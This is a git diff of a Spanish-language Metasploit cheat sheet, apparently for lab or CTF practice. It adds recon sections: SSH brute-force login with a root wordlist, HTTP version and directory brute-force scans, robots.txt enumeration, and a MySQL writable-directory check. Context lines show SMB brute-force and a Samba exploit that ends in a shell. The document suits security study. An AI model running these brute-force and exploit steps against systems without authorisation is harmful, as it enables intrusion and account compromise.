@@ -140,7 +140,7 @@ Non-Stage               # Sends exploit shellcode all at once. Larger in size an
 Staged                  # Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**
 ```
 
-## Puerto 445 'Reconocimiento'
+## Puerto 445 SMB 'Reconocimiento'
 
 ```bash 
 # Miramos la version del SMB
@@ -184,7 +184,7 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 ```
 
 ```bash 
-	# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
 ❯ msfconsole -q                                               # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
@@ -213,7 +213,7 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ run 
 ```
 
-## Puerto 445 'Exploit'
+## Puerto 445 SMB 'Exploit'
 
 ```bash 
 # Algunas versiones con exploit (3.0.20)
@@ -226,4 +226,70 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 	❯ set LHOSTS 192.168.1.157                     # Colocamos la IP de nuestra maquina 
 	❯ run 
 	❯ shell 
+```
+
+## Puerto 22 SSH 'Reconocimiento'
+
+```bash 
+# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/ssh/ssh_login         # Usamos el auxiliar
+	❯ options
+	❯ set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+	❯ set STOP_ON_SUCCESS true
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set verbose true
+	❯ run 
+```
+
+
+## Puerto 80 HTTP 'Reconocimiento'
+
+```bash 
+# Miramos la version del HTTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumeracion de directorios
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ exploit 
+```
+
+```bash 
+# Enumeracion de robots 'bot'
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+
+## Puerto 3306 MYSQL 'Reconocimiento'
+
+```bash 
+# Nos dice que directorios tienen privilegios de escritura 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/mysql/mysql_writable_dirs        # Usamos el auxiliar 
+	❯ options
+	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
+	❯ set verbose false
+	❯ advanced                                               # Mirar las opciones avanzadas
+	❯ set password ""
+	❯ run 
+```
 ```
